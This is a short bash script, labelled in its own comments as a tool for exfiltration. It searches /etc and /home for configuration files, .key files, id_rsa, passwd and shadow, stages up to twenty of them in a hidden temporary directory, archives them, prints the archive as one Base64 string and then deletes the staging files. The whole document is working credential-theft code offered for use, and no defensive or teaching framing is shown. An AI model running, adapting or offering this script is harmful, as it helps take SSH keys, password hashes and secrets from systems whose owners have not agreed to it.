#!/bin/bash
# -----------------------------------------------------------------------------
# Stages sensitive files into a temporary directory, archives them, and outputs
# a Base64 encoded string for exfiltration.
# -----------------------------------------------------------------------------

STAGING_DIR="/tmp/.exfil_$(date +%s)"
mkdir -p "$STAGING_DIR"

# Search and Stage Files (Limit 20)
find /etc /home -maxdepth 3 -type f \( -name "*.conf" -o -name "*.config" -o -name "*.key" -o -name "id_rsa" -o -name "passwd" -o -name "shadow" \) 2>/dev/null | head -n 20 | while read -r file; do
    cp "$file" "$STAGING_DIR/" 2>/dev/null
done

ARCHIVE_NAME="/tmp/exfil_data.tar.gz"
tar -czf "$ARCHIVE_NAME" -C "$STAGING_DIR" . 2>/dev/null

if [ -f "$ARCHIVE_NAME" ]; then
    # Output Base64 Encoded Archive
    base64 "$ARCHIVE_NAME" | tr -d '\n'
    echo "" # Ensure newline at end

    # Cleanup
    rm -rf "$STAGING_DIR"
    rm "$ARCHIVE_NAME"
fi
